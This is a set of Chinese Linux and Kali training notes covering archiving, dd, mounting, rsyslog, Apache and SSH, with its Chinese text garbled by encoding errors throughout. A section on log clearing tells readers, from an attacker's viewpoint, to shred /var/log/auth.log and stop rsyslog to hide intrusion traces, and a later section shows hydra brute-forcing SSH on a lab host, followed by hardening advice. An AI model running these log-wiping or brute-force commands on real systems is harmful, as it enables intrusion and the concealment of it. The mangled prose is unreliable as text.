//æŠŠå¤šä¸ªæ–‡ä»¶æ‰“åŒ…æˆä¸€ä¸ªtaråŒ…

tar -tvf  net_config.tar 
//ä»taråŒ…ä¸­æ˜¾ç¤ºè¿™äº›æ–‡ä»¶ï¼Œè€Œä¸éœ€è¦æå–å®ƒä»¬

tar -xf net_config.tar 
// è§£åŒ…

cp /etc/ssh/sshd_config .  

tar -rf net_config.tar sshd_config 
//æŠŠæ–‡ä»¶è¿½åŠ åˆ°åŒ…æ–‡ä»¶ä¸­    


34.3 å¯¹åŒ…æ–‡ä»¶è¿›è¡Œå‹ç¼©

gzipï¼Œå®ƒä½¿ç”¨æ‰©å±•å.tar.gz æˆ–.tgz
bzip2ï¼Œå®ƒä½¿ç”¨æ‰©å±•å.tar.bz2
compressï¼Œå®ƒä½¿ç”¨æ‰©å±•å.tar.z
compress æ˜¯æœ€å¿«çš„ï¼Œä½†æ˜¯ç”Ÿæˆçš„æ–‡ä»¶æ˜¯æ›´å¤§çš„ï¼› bzip2 æ˜¯æœ€æ…¢çš„ï¼Œä½†æ˜¯ç”Ÿæˆçš„æ–‡ä»¶æ˜¯æœ€å°çš„ï¼›
gzip ä»‹äºä¸¤è€…ä¹‹é—´

ï¼ˆ1ï¼‰gzip
å®ƒæ˜¯ Linux ä¸­æœ€å¸¸ç”¨çš„å‹ç¼©å®ç”¨ç¨‹åº
gzip [OPTION]... [FILE]...

gzip net_config.tar ï¼ˆå‹ç¼©ï¼‰

ls -lh             
-rw-r--r-- 1 root root 2.0K 10æœˆ 20 11:06 net_config.tar.gz


è§£å‹ç¼©ï¼ˆ-dï¼‰
 æ–¹æ³•1ï¼š gzip -d net_config.tar.gz
 æ–¹æ³•2ï¼š gunzip net_config.tar.gz 

 
### Day35**Chapter 9 å‹ç¼©å’Œå½’æ¡£ï¼ˆæ‰“åŒ…ï¼‰2

cp /etc/hosts .  
cp /etc/resolv.conf . 
cp /etc/network/interfaces . 
cp /etc/ssh/sshd_config .
 .tar.gz 
.tgz      

tar -xzf net_config.tar.gz  
tar -tvzf net_config.tar.gz 
tar -czf net02.tar.gz hosts resolv.conf interfaces sshd_config 

35.2. ç”¨ bzip2 å‹ç¼©

è§£å‹ç¼©
bzip2 -d net_config.tar.bz2
bunzip2 net_config.tar.bz2 

bzip2+tar 

.tar.bz2   tar xjf  
.tar.gz    tar xzf 

æ¡ˆä¾‹
	apache---WebæœåŠ¡ç¨‹åº  httpd
	 HTTP Server ("httpd") 
	
	http://httpd.apache.org/

wget https://dlcdn.apache.org//httpd/httpd-2.4.51.tar.gz  

éœ€æ±‚1:å¦‚ä½•æ ¡éªŒä¸‹è½½æ–‡ä»¶çš„å®Œæ•´æ€§ï¼Ÿ

hashç®—æ³•---hashå€¼ï¼ˆæŒ‡çº¹ï¼‰çš„æ¯”å¯¹æ ¡éªŒä¸‹è½½æ–‡ä»¶çš„å®Œæ•´æ€§
SHA-2ï¼ˆSHA-256ã€SHA-512ç­‰ï¼‰

sha256sum httpd-2.4.51.tar.gz

sha256sum -c httpd-2.4.51.tar.gz.sha256
éœ€æ±‚2ï¼šè¦æŠŠæœ¬åœ°æ–‡ä»¶ä¸Šä¼ åˆ°è¿œç¨‹çš„LinuxæœåŠ¡å™¨ä¸Šï¼Ÿ

å°æ–‡ä»¶ï¼š 
	æ–¹æ³•1 æ¨èä½¿ç”¨lrzszè½¯ä»¶åŒ…æä¾›çš„ç¨‹åº
	//apt-get install lrzsz

		 rz  --æ¥æ”¶æ–‡ä»¶
		 sz  --å‘é€æ–‡ä»¶

å¤§æ–‡ä»¶ï¼š Winscp ã€xftpç­‰ç±»ä¼¼çš„å·¥å…·ï¼ˆåŸç†ï¼šåˆ©ç”¨sftpåè®®å®ç°ä¸è¿œç¨‹Linuxäº¤äº’ï¼‰



éœ€æ±‚3ï¼š tar.gz æˆ– tar.bz2 æ–‡ä»¶çš„è§£å‹
tar xzf 
tar xjf 

### Day36**Chapter 9 å‹ç¼©å’Œå½’æ¡£ï¼ˆæ‰“åŒ…ï¼‰2

36.1. ç”¨ compress å‹ç¼©ï¼ˆä¸å¸¸ç”¨ï¼‰

compress httpd2.tar 

æ ¼å¼ï¼š.tar.Z

compress æ˜¯æœ€å¿«çš„ï¼Œä½†æ˜¯ç”Ÿæˆçš„æ–‡ä»¶æ˜¯æ›´å¤§çš„ï¼› bzip2æ˜¯æœ€æ…¢çš„ï¼Œä½†æ˜¯ç”Ÿæˆçš„æ–‡ä»¶æ˜¯æœ€å°çš„ï¼›
gzip ä»‹äºä¸¤è€…ä¹‹é—´ã€‚
â”€(rootğŸ’€kali2)-[~/work/exam/day36]
â””â”€# ls -lh                 
æ€»ç”¨é‡ 75M
  16M 10æœˆ 22 09:05 httpd2.tar.Z   compress -d   uncompress    tar xZf
 7.3M 10æœˆ 22 09:09 httpd3.tar.bz2 bzip2 -d      bunzip2       tar xjf  tar xaf
 9.5M 10æœˆ 22 09:10 httpd4.tar.gz  gzip -d       gunzip        tar xzf
  43M 10æœˆ  7 23:17 httpd.tar

36.2. .7zæ ¼å¼å‹ç¼©æ–‡ä»¶
hashcat--é«˜çº§çš„å¯†ç ï¼ˆhashå£ä»¤ï¼‰ç ´è§£å·¥å…·
https://hashcat.net/hashcat/

7z
7za

7za x hashcat-2.00.7z -r -o./

x  ä»£è¡¨è§£å‹ç¼©æ–‡ä»¶ï¼Œå¹¶ä¸”æ˜¯æŒ‰åŸå§‹ç›®å½•æ ‘è§£å‹
-r è¡¨ç¤ºé€’å½’è§£å‹ç¼©æ‰€æœ‰çš„å­æ–‡ä»¶å¤¹
-o æ˜¯æŒ‡å®šè§£å‹åˆ°çš„ç›®å½•ï¼Œ-oåæ˜¯æ²¡æœ‰ç©ºæ ¼çš„ï¼Œç›´æ¥æ¥ç›®å½•ã€‚è¿™ä¸€ç‚¹éœ€è¦æ³¨æ„ã€‚


36.3. tar.xz

-J, --xz                   é€šè¿‡ xz å¤„ç†å½’æ¡£


36.4. åˆ›å»ºå­˜å‚¨è®¾å¤‡çš„ç‰©ç†å‰¯æœ¬
dd å‘½ä»¤é€ä¸ªæ¯”ç‰¹ä½å¤åˆ¶æ–‡ä»¶ã€æ–‡ä»¶ç³»ç»Ÿï¼Œç”šè‡³æ•´ä¸ªç¡¬ç›˜é©±åŠ¨å™¨ã€‚è¿™æ„å‘³ç€å³ä½¿åˆ é™¤çš„æ–‡ä»¶ä¹Ÿä¼šè¢«å¤åˆ¶
å¯¹å­˜å‚¨è®¾å¤‡è¿›è¡Œç‰©ç†å¤åˆ¶
cp ä¸ä¼šå¤åˆ¶åˆ é™¤çš„æ–‡ä»¶
å…¸å‹çš„åº”ç”¨ï¼š
ï¼ˆ1ï¼‰ç£ç›˜å®Œæ•´çš„å‰¯æœ¬åˆ¶ä½œ
ï¼ˆ2ï¼‰ç”µå­å–è¯
ï¼ˆ3ï¼‰dd å‘½ä»¤ä¸åº”è¯¥ç”¨äºå…¸å‹çš„æ–‡ä»¶å’Œå­˜å‚¨è®¾å¤‡çš„æ—¥å¸¸å¤åˆ¶ï¼Œå› ä¸ºå®ƒéå¸¸æ…¢ï¼Œå…¶ä»–å‘½ä»¤æ‰§è¡Œ
èµ·æ¥æ›´å¿«ã€æ›´æœ‰æ•ˆ
åŸºæœ¬ç”¨æ³• 
   dd if=è¾“å…¥æ–‡ä»¶ of=è¾“å‡ºæ–‡ä»¶
å¸¸ç”¨é€‰é¡¹
	bs=å•ä½å¤§å°  é»˜è®¤æ˜¯512å­—èŠ‚ï¼ˆbs é€‰é¡¹å…è®¸æ‚¨ç¡®å®šè¦å¤åˆ¶çš„æ•°æ®çš„å—å¤§å°(æ¯ä¸ªå—çš„è¯»/å†™å­—èŠ‚æ•°)ï¼‰
	count=N      æŒ‡å®šå•ä½çš„æ•°é‡
	noerror ï¼šå³ä½¿é‡åˆ°é”™è¯¯ï¼Œ noerror é€‰é¡¹ä¹Ÿä¼šç»§ç»­å¤åˆ¶ã€‚
              copy only N input blocks

â”Œâ”€â”€(rootğŸ’€kali2)-[~/work/exam/day36]
â””â”€# dd bs=1M count=10 if=/dev/zero of=f1
è®°å½•äº†10+0 çš„è¯»å…¥
è®°å½•äº†10+0 çš„å†™å‡º
10485760å­—èŠ‚ï¼ˆ10 MBï¼Œ10 MiBï¼‰å·²å¤åˆ¶ï¼Œ0.00539446 sï¼Œ1.9 GB/s
                                                                                                                                                                            
â”Œâ”€â”€(rootğŸ’€kali2)-[~/work/exam/day36]
â””â”€# ls -lh f1         
-rw-r--r-- 1 root root 10M 10æœˆ 22 10:24 f1

ã€æ¡ˆä¾‹2ã€‘ä¸ºæŒ‡å®šUç›˜åšä¸€ä¸ªå‰¯æœ¬
dd if=/dev/sdb of=/root/flashcopy	

ã€æ¡ˆä¾‹3ã€‘
dd if=/dev/media of=/root/flashcopy bs=4096 conv=noerror
	
ã€å¤‡ä»½MBRã€‘
dd if=/dev/sda of=/root/image count=1 bs=512




# ç¬”è®°(day37-day40)

2021.10æœˆä»½æ¯æ—¥åˆ†äº«.æ–¹å‘
1. åˆ†äº«å¸¸ç”¨çš„Linuxå‘½ä»¤ï¼ˆé‡ç‚¹ï¼‰
2. åˆ†äº« è‹±æ–‡å•è¯
3. åˆ†äº« æœ€è¿‘å®‰å…¨çƒ­ç‚¹
4. åˆ†äº« å°æŠ€å·§
### *Day37*
tar cvzf    tar.gz
tar cvjf    tar.bz2

tar tvf

tar xvzf   tar.gz
tar xvjf   tar.bz2
tar xvaf
ç¬¬10ç«  æ–‡ä»¶ç³»ç»Ÿå’Œå­˜å‚¨è®¾å¤‡çš„ç®¡ç†
10.1 å¯¹å­˜å‚¨è®¾å¤‡çš„è¡¨ç¤º

Linux ä¸­çš„æ¯ä¸ªè®¾å¤‡éƒ½ç”±/dev ç›®å½•ä¸­çš„æ–‡ä»¶è¡¨ç¤º
ls -l | grep -v "æ€»" |  cut -c1 | sort  | uniq -c

è®¾å¤‡ç±»å‹ä¸»è¦æœ‰ä¸¤ç§
block ï¼ˆå—è®¾å¤‡ï¼‰-b---å­˜å‚¨è®¾å¤‡
characterï¼ˆå­—ç¬¦è®¾å¤‡ï¼‰c--å¦‚ç»ˆç«¯


è½¯ç›˜ fd0
ç¡¬ç›˜
 hdx  ä½¿ç”¨ IDE æˆ– E-IDEæ¥å£
 sdx  ä½¿ç”¨SATAã€SCSIæ¥å£ï¼ˆUç›˜ä¹Ÿè®¤ä¸ºæ˜¯SATAè®¾å¤‡ï¼‰
	sda ç¬¬ä¸€ä¸ªsataç¡¬ç›˜é©±åŠ¨å™¨  /dev/sda
 sr0  å…‰ç›˜é©±åŠ¨å™¨ï¼ˆä½¿ç”¨SATAã€SCSIæ¥å£ï¼‰
 /dev/cdromæ˜¯/dev/sr0çš„å¿«æ·æ–¹å¼
 â”Œâ”€â”€(rootğŸ’€kali2)-[~]
â””â”€# ls -l /dev/cdrom
lrwxrwxrwx 1 root root 3 10æœˆ 25 10:25 /dev/cdrom -> sr0

ç¡¬ç›˜åˆ†åŒº
  æœ‰å››ä¸ªåˆ†åŒºï¼ˆä¸»åˆ†åŒºï¼‰ç¼–å·ï¼ˆ1-4ï¼‰
  
  å¼•å…¥äº†æ‰©å±•åˆ†åŒºï¼ˆå¯ä»¥åœ¨æ‰©å±•åˆ†åŒºä¸­åˆ’åˆ†é€»è¾‘åˆ†åŒºï¼‰ï¼Œæ‰©å±•åˆ†åŒºå ç”¨ä¸€ä¸ªä¸»åˆ†åŒºç¼–å· 
  é€»è¾‘åˆ†åŒºçš„ç¼–å·ä»5å¼€å§‹
  
  /dev/sda1
  MBRï¼ˆç¡¬ç›˜çš„ç¬¬ä¸€ä¸ªæ‰‡åŒºï¼Œ512å­—èŠ‚ï¼‰ä¸»å¼•å¯¼è®°å½•
  ç”±æ“ä½œç³»ç»Ÿå¼•å¯¼ç¨‹åº+åˆ†åŒºè¡¨+æ‰‡åŒºç»“æŸæ ‡å¿—
     446              64      2
 æŸ¥çœ‹ Linux ç³»ç»Ÿä¸Šçš„åˆ†åŒº    fdisk -l 
æ–‡ä»¶ç³»ç»Ÿç±»å‹
	æ˜¯æ“ä½œç³»ç»Ÿå®šä¹‰çš„æ¦‚å¿µï¼Œä¸åŒçš„æ“ä½œç³»ç»Ÿæ”¯æŒçš„æ–‡ä»¶ç³»ç»Ÿç±»å‹æ˜¯ä¸ä¸€æ ·çš„ï¼Œ
	ä¸åŒçš„æ–‡ä»¶ç³»ç»Ÿå…¶æ–‡ä»¶çš„å­˜å‚¨å’Œç®¡ç†æ–¹å¼ä¹Ÿä¸åŒã€‚
	ç›¸å½“äºåˆ†åŒºçš„æ ¼å¼
	Linux ä½¿ç”¨è®¸å¤šä¸åŒç±»å‹çš„æ–‡ä»¶ç³»ç»Ÿï¼Œä½†æœ€å¸¸è§çš„æ˜¯  ext3 å’Œ ext4ã€xfs
	
    æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç±»å‹ df -T

è®¾å¤‡çš„æŒ‚è½½å’Œå¸è½½

mount è®¾å¤‡æ–‡ä»¶  æŒ‚è½½ç‚¹
å¦‚æœå°†è®¾å¤‡æŒ‚è½½åˆ°å…·æœ‰å­ç›®å½•å’Œæ–‡ä»¶çš„ç›®å½•ä¸Šï¼Œåˆ™æŒ‚è½½çš„è®¾å¤‡å°†è¦†ç›–è¯¥ç›®å½•çš„å†…å®¹ï¼Œä½¿å…¶ä¸å¯è§ä¸”ä¸å¯ç”¨ã€‚
	
umount è®¾å¤‡æ–‡ä»¶|æŒ‚è½½ç‚¹
mount  æŸ¥çœ‹æ–‡ä»¶ç³»ç»ŸæŒ‚è½½çš„è¯¦ç»†ä¿¡æ¯
-o  æŒ‡å®šæŒ‚è½½é€‰é¡¹
mount -o ro /dev/sdb1 /mnt/usb

è·å–æŒ‚è½½ç£ç›˜ä¸Šçš„ä¿¡æ¯
df 
  -T æŸ¥çœ‹æ–‡ä»¶ç³»ç»Ÿç±»å‹ df -T
  -h ä»¥åˆé€‚çš„å®¹é‡å•ä½æ˜¾ç¤º
fsck å‘½ä»¤æ£€æŸ¥æ–‡ä»¶ç³»ç»Ÿçš„é”™è¯¯å¹¶ä¿®å¤æŸå
 fsck -p /dev/sdb1  è‡ªåŠ¨ä¿®å¤

Windows fsck -f H:



### *Day38*
11. æ—¥å¿—ç³»ç»Ÿçš„ç®¡ç†
11.1. æ¦‚è¿° 
æ—¥å¿—æ–‡ä»¶å­˜å‚¨å…³äºæ“ä½œç³»ç»Ÿå’Œåº”ç”¨ç¨‹åºè¿è¡Œæ—¶å‘ç”Ÿçš„äº‹ä»¶çš„ä¿¡æ¯ï¼ŒåŒ…æ‹¬ä»»ä½•é”™è¯¯å’Œå®‰å…¨è­¦æŠ¥ã€‚
ä½œä¸ºé»‘å®¢ï¼Œæ—¥å¿—æ–‡ä»¶å¯ä»¥è·Ÿè¸ªç›®æ ‡çš„æ´»åŠ¨å’Œèº«ä»½ã€‚

11.2. æ—¥å¿—æœåŠ¡
æ—¥å¿—æœåŠ¡å™¨ ç›‘å¬åœ¨UDP/514ç«¯å£

syslog ç¨‹åºé€šå¸¸æœ‰ä¸¤ä¸ªåŒ…æ‹¬ rsyslogï¼ˆCentosã€Debianï¼‰ å’Œ syslog-ng

locate rsyslog
ä¸rsyslogç›¸å…³çš„æ–‡ä»¶
/etc/rsyslog.conf  //é…ç½®æ–‡ä»¶
/etc/init.d/rsyslog //rsyslogçš„æœåŠ¡è„šæœ¬
/usr/sbin/rsyslogd  //rsyslogçš„æœåŠ¡ç¨‹åº

systemctl status rsyslog  //æŸ¥çœ‹rsyslogçš„æœåŠ¡çŠ¶æ€

11.3. æ—¥å¿—è§„åˆ™ï¼ˆruleï¼‰
rsyslog è§„åˆ™å†³å®šè®°å½•å“ªç§ç±»å‹çš„ä¿¡æ¯ï¼Œè®°å½•å“ªäº›ç¨‹åºçš„æ¶ˆæ¯ï¼Œä»¥åŠå°†æ—¥å¿—å­˜å‚¨åœ¨ä½•å¤„
æ—¥å¿—è§„åˆ™çš„åŸºæœ¬æ ¼å¼ï¼š
facility.priority  action

facility å…³é”®å­—å¼•ç”¨æ­£åœ¨è®°å½•å…¶æ¶ˆæ¯çš„ç¨‹åºï¼Œä¾‹å¦‚é‚®ä»¶ã€å†…æ ¸æˆ–æ‰“å°ç³»ç»Ÿã€‚ 
priority å…³é”®å­—å†³å®šä¸ºè¯¥ç¨‹åºè®°å½•å“ªç§ç±»å‹çš„æ¶ˆæ¯ã€‚
action å…³é”®å­—å¼•ç”¨å°†å‘é€æ—¥å¿—çš„ä½ç½®ã€‚

æ¶ˆæ¯çš„ç±»å‹

priorityå‘Šè¯‰ç³»ç»Ÿè¦è®°å½•å“ªç§æ¶ˆæ¯ã€‚ 
ä¸‹åˆ—ä»£ç ä»æœ€ä½ä¼˜å…ˆçº§åˆ—å‡ºï¼Œä»è°ƒè¯•å¼€å§‹åˆ°æœ€é«˜ä¼˜å…ˆçº§ï¼Œä»¥ä¸¥é‡ç»“æŸã€‚
â€¢ debug--è°ƒè¯•ï¼ˆæœ€ä½ï¼‰
â€¢ info
â€¢ notice
â€¢ warning
â€¢ warn
â€¢ error
â€¢ err
â€¢ crit
â€¢ alert
â€¢ emerg
â€¢ panic *ï¼ˆæœ€é«˜ï¼‰

0 Emergency: system is unusable
1 Alert: action must be taken immediately
2 Critical: critical conditions
3 Error: error conditions
4 Warning: warning conditions
5 Notice: normal but significant condition
6 Informational: informational messages
7 Debug: debug-level messages

å¦‚æœä¼˜å…ˆçº§ä¸º*ï¼Œåˆ™è®°å½•æ‰€æœ‰ä¼˜å…ˆçº§çš„æ¶ˆæ¯ã€‚æŒ‡å®šä¼˜å…ˆçº§æ—¶ï¼Œå°†è®°å½•è¯¥ä¼˜å…ˆçº§åŠæ›´é«˜ä¼˜å…ˆçº§çš„æ¶ˆæ¯ã€‚

æ—¥å¿—æ–‡ä»¶é€šå¸¸è¢«å‘é€åˆ°/var/log ç›®å½•ï¼Œå…¶æ–‡ä»¶åæè¿°ä¸ºç”Ÿæˆå®ƒä»¬çš„ç¨‹åº

actionéƒ¨åˆ†
 æŒ‡å®šçš„æ–‡ä»¶
 @IPåœ°å€  å‘é€åˆ°æŒ‡å®šçš„æ—¥å¿—æœåŠ¡å™¨ä¸­


11.4. ä½¿ç”¨ LOGROTATE è‡ªåŠ¨æ¸…ç†æ—¥å¿—

ROTATE--å¾ªç¯
logrotate æ˜¯é€šè¿‡å°†æ—¥å¿—æ–‡ä»¶ç§»åŠ¨åˆ°å…¶ä»–ä½ç½®æ¥å®šæœŸå½’æ¡£æ—¥å¿—æ–‡ä»¶çš„è¿‡ç¨‹ï¼Œä»è€Œä¸ºæ‚¨ç•™ä¸‹ä¸€ä¸ªæ–°çš„æ—¥å¿—
æ–‡ä»¶ã€‚ç„¶åï¼Œåœ¨æŒ‡å®šçš„ä¸€æ®µæ—¶é—´ä¹‹åï¼Œå½’æ¡£çš„ä½ç½®å°†è¢«æ¸…ç†ã€‚

logrotate ç¨‹åºçš„é…ç½®æ–‡ä»¶/etc/logrotate.conf

11.5. æ—¥å¿—çš„æ¸…ç†ï¼ˆåˆ é™¤ï¼‰
ä»æ”»å‡»è€…çš„è§’åº¦ï¼Œå¯¹æ—¥å¿—çš„æ¸…ç†å¯ä»¥ä¸è®©ç³»ç»Ÿç•™ä¸‹å…¥ä¾µçš„ç—•è¿¹ï¼Œä¿æŒéšèº«
ï¼ˆ1ï¼‰åˆ é™¤æ´»åŠ¨çš„ä»»ä½•æ—¥å¿—
shred 
å¯ä»¥åˆ é™¤æ–‡ä»¶å¹¶å¤šæ¬¡æ“¦å†™è¦†ç›–å®ƒï¼Œè¿™ä½¿å¾—æ¢å¤å˜å¾—æ›´åŠ å›°éš¾
é»˜è®¤æƒ…å†µä¸‹ï¼Œ shred å°†è¦†ç›– 3æ¬¡
-f é€‰é¡¹ï¼Œå®ƒæ›´æ”¹æ–‡ä»¶çš„æƒé™ï¼Œä»¥ä¾¿åœ¨éœ€è¦æ›´æ”¹æƒé™æ—¶å…è®¸è¦†ç›–ï¼› 
-n é€‰é¡¹ï¼Œå®ƒå…è®¸æ‚¨é€‰æ‹©è¦†ç›–æ–‡ä»¶çš„æ¬¡æ•°
 shred -f -n 10 /var/log/auth.log*
ï¼ˆ2ï¼‰ç¦ç”¨æ—¥å¿—ç³»ç»Ÿ--éœ€è¦rootæƒé™
å½“é»‘å®¢æ§åˆ¶äº†ä¸€ä¸ªç³»ç»Ÿï¼Œä»–ä»¬å¯ä»¥ç«‹å³ç¦ç”¨æ—¥å¿—ï¼Œä»¥é˜²æ­¢ç³»ç»Ÿè·Ÿè¸ªä»–ä»¬çš„æ´»åŠ¨ã€‚

systemctl stop rsyslog  //å…³é—­æ—¥å¿—æœåŠ¡


### *Day39*
12. ç†Ÿç»ƒä½¿ç”¨æœåŠ¡

12.1. æœåŠ¡æ¦‚è¿°
æœåŠ¡æ˜¯åœ¨åå°è¿è¡Œçš„åº”ç”¨ç¨‹åºï¼Œç­‰å¾…æ‚¨ä½¿ç”¨å®ƒï¼ŒLinuxä¸­ç§°ä¸ºDaemonè¿›ç¨‹
Apache è®¾ç½® web æœåŠ¡å™¨
OpenSSHæœåŠ¡ ---è¿œç¨‹è®¿é—®
ä½¿ç”¨ MySQL è®¿é—®æ•°æ®--æ•°æ®åº“æœåŠ¡
PostgreSQLï¼ˆæ•°æ®åº“æœåŠ¡ï¼‰ å­˜å‚¨é»‘å®¢ä¿¡æ¯ï¼Œå¦‚åœ¨MSFä¸­ä¼šä½¿ç”¨PostgreSQL

æœåŠ¡æ§åˆ¶å·¥å…·
systemctl åŠ¨ä½œå‘½ä»¤  æœåŠ¡åç§°

åŠ¨ä½œå‘½ä»¤
	å¯åŠ¨ start
	åœæ­¢ stop
	é‡å¯ restart
	çŠ¶æ€ status 
	æŠŠæœåŠ¡è®¾ç½®ä¸ºå¼€æœºå¯åŠ¨ enable 
	æŠŠæœåŠ¡è®¾ç½®ä¸ºå¼€æœºä¸å¯åŠ¨ disable
	æŸ¥è¯¢æœåŠ¡æ˜¯å¦å¼€æœºå¯åŠ¨  is-enabled


apache2

12.1. ä½¿ç”¨apache2æœåŠ¡æ¶è®¾ç½‘ç«™
ç¯å¢ƒï¼šKaliï¼ˆDebianï¼‰

apt-get install apache2

systemctl start apache2

lsof -i :80

ï¼ˆ1ï¼‰é…ç½®æ–‡ä»¶è§£æ

 å¸®åŠ©æ–‡æ¡£ /usr/share/doc/apache2/README.Debian.gz
 
 é…ç½®æ–‡ä»¶ç›®å½•  /etc/apache2

 â”Œâ”€â”€(rootğŸ’€kali2)-[/etc/apache2]
â””â”€# tree -L 1  /etc/apache2
/etc/apache2
â”œâ”€â”€ apache2.conf //ä¸»é…ç½®æ–‡ä»¶ï¼ˆ main configuration fileï¼‰
â”œâ”€â”€ conf-available
â”œâ”€â”€ conf-enabled  //å…¨å±€æŒ‡ä»¤é…ç½®
		*.conf
â”œâ”€â”€ envvars
â”œâ”€â”€ magic
â”œâ”€â”€ mods-available
â”œâ”€â”€ mods-enabled  //æ¨¡å—çš„ç®¡ç†
	   *.load
	   *.conf
â”œâ”€â”€ ports.conf  //å®šä¹‰ç›‘å¬çš„åœ°å€å’Œç«¯å£
â”œâ”€â”€ sites-available
â””â”€â”€ sites-enabled  //å®šä¹‰äº†è™šæ‹Ÿä¸»æœºçš„é…ç½®


/etc/apache2/apache2.conf
å‘½ä»¤è¯­å¥è§£æ
Include ports.conf  //åŒ…å«ports.confä¸­çš„é…ç½®


ports.conf 

	Listen 192.168.195.76:8088 //å®šä¹‰ç›‘å¬çš„åœ°å€å’Œç«¯å£

2. apache2çš„å¯åŠ¨è„šæœ¬å’ŒæœåŠ¡ç¨‹åº
ï¼ˆ1ï¼‰æœåŠ¡è„šæœ¬æ§åˆ¶ç¨‹åº
/etc/init.d/apache2 
apache2ctl
ï¼ˆ2ï¼‰æœåŠ¡ç¨‹åº
/usr/bin/apache2

3. ç½‘ç«™çš„ä¸»ç›®å½•
é»˜è®¤æ˜¯/var/www/html
 
 
 
 
 
 
 
 











# ç¬”è®°ï¼ˆDay41-Day43)ï¼‰
### *Day41**

ln  åˆ›å»ºé“¾æ¥æ–‡ä»¶ â˜…â˜…â˜…â˜…â˜…

åˆ›å»ºä¸€ä¸ªè½¯é“¾æ¥ï¼ˆç±»ä¼¼Windowsä¸­çš„å¿«æ·æ–¹å¼ï¼‰

ln  -s æºæ–‡ä»¶ é“¾æ¥æ–‡ä»¶  

41.1. SSHæœåŠ¡ä»‹ç»
SSH æ˜¯ Secure Shell çš„ç®€å†™ã€‚
èƒ½å¤Ÿæä¾›ä¸€ä¸ªå®‰å…¨çš„è¿œç¨‹è¿æ¥
tcp/22

systemctl start ssh  å¯åŠ¨SSHæœåŠ¡
systemctl enable ssh æŠŠSSHæœåŠ¡è®¾ç½®ä¸ºå¼€æœºå¯åŠ¨

ä½¿rootç”¨æˆ·å¯ä»¥é€šè¿‡å£ä»¤çš„æ–¹å¼è¿œç¨‹è¿æ¥åˆ°Kali

SSHæœåŠ¡é…ç½®æ–‡ä»¶ 
/etc/ssh/sshd_config  â˜…â˜…â˜…â˜…â˜…

	PermitRootLogin yes

41.2. è¿œç¨‹è¿æ¥SSHæœåŠ¡å™¨

nmap -p 22 192.168.195.76

-p æŒ‡å®šæ‰«æçš„ç«¯å£

ssh  ç”¨æˆ·å@è¿œç¨‹ä¸»æœº

ssh root@192.168.195.76  â˜…â˜…â˜…â˜…â˜…
	-p æŒ‡å®šè¿æ¥ç«¯å£

â”Œâ”€â”€(rootğŸ’€kali)-[/usr/share/sqlmap/tamper]
â””â”€# ssh root@192.168.195.76                                                                                                                             255 â¨¯
The authenticity of host '192.168.195.76 (192.168.195.76)' can't be established.
ECDSA key fingerprint is SHA256:AzeAA3yDuLrac02AVLi18K9X6SIgZidi87RSC3RunIw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? 

41.3. é’ˆå¯¹sshçš„æš´åŠ›ç ´è§£

Step1: å‡†å¤‡ä¸€ä¸ªå£ä»¤å­—å…¸

cat >>password_list << EOF

Step2 å‡†å¤‡ä¸€ä¸ªå£ä»¤ç ´è§£å·¥å…·

 hydra 
 ç”¨æˆ·ç™»å½•å£ä»¤ç ´è§£å·¥å…·ï¼Œæ”¯æŒå¤šç§ç™»å½•åè®®

åŸºæœ¬ç”¨æ³•ï¼š
	hydra -l user -P passlist.txt ssh://192.168.0.1
	-l  æŒ‡å®šç™»å½•çš„ç”¨æˆ·å
	-P  å£ä»¤å­—å…¸æ–‡ä»¶
	
Centos å®‰å…¨æ—¥å¿—æ–‡ä»¶ï¼š /var/log/secure

41.4. å¦‚ä½•é˜²èŒƒé’ˆå¯¹SSHçš„å£ä»¤æš´åŠ›ç ´è§£

ï¼ˆ1ï¼‰æ›´æ”¹é»˜è®¤çš„æœåŠ¡ç«¯å£
Port 22226

netstat -tnlp | grep "sshd" 

å®¢æˆ·ç«¯è¿æ¥
ssh -p 22226 root@192.168.195.76  
æœåŠ¡ç«¯æŸ¥çœ‹è¿æ¥
lsof -i :22226
netstat -tanlp | grep "sshd"

é»‘å®¢
nmap -p 1-65535 192.168.195.76
nmap -p- 192.168.195.76

	PS:ç«¯å£å·çš„èŒƒå›´  1-65535
nmap -sV -p- 192.168.195.76 
   -sV  æ¢æµ‹æœåŠ¡çš„ç‰ˆæœ¬


â”Œâ”€â”€(rootğŸ’€kali2)-[~]
â””â”€# nmap -sV -p- 192.168.195.76
Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-01 11:28 CST
Nmap scan report for www.xiaofeixia.com (192.168.195.76)
Host is up (0.0000020s latency).
Not shown: 65533 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.48 ((Debian))
22226/tcp open  ssh     OpenSSH 8.4p1 Debian 6 (protocol 2.0)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel


 hydra -l root -P password.lst -s 22226 ssh://192.168.195.76
 -s  æŒ‡å®šæœåŠ¡ç«¯å£

### Day42### ### *
â˜…â˜…â˜…â˜…â˜…
42.1. å¦‚ä½•é˜²èŒƒé’ˆå¯¹SSHçš„å£ä»¤æš´åŠ›ç ´è§£

ï¼ˆ1ï¼‰æ›´æ”¹é»˜è®¤çš„æœåŠ¡ç«¯å£
ï¼ˆ2ï¼‰è®¾ç½®å¤æ‚çš„å¯†ç ä¸”å®šæœŸæ›´æ”¹å£ä»¤
ï¼ˆ3ï¼‰ä½¿ç”¨å¯†é’¥è®¤è¯
ï¼ˆ4ï¼‰å®šæœŸæŸ¥çœ‹å®‰å…¨æ—¥å¿—æ–‡ä»¶
ï¼ˆ5ï¼‰TCP Wrappersæœºåˆ¶ â˜…â˜…â˜…â˜…â˜…
TCP Wrappersä¹Ÿè¢«ç§°ä¸ºtcp_wrappersã€‚ å®ƒæ˜¯ä¸€ä¸ªåŸºäºä¸»æœºçš„ç½‘ç»œè®¿é—®æ§åˆ¶åˆ—è¡¨ç³»ç»Ÿï¼Œç±»ä¼¼äºACL

TCP Wrappersçš„æ ¸å¿ƒæ˜¯åä¸ºlibwrapçš„åº“ï¼Œ æ‰€æœ‰è°ƒç”¨è¿™ä¸ªåº“çš„ç¨‹åºéƒ½å¯ä»¥åˆ©ç”¨libwrapæä¾›çš„ç½‘ç»œè®¿é—®æ§åˆ¶èƒ½åŠ›ã€‚
åœ¨Linuxç³»ç»Ÿä¸­ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨lddå‘½ä»¤æ¥åˆ¤æ–­ä¸€ä¸ªç¨‹åºæ˜¯å¦è°ƒç”¨äº†libwrapçš„åº“ï¼Œ
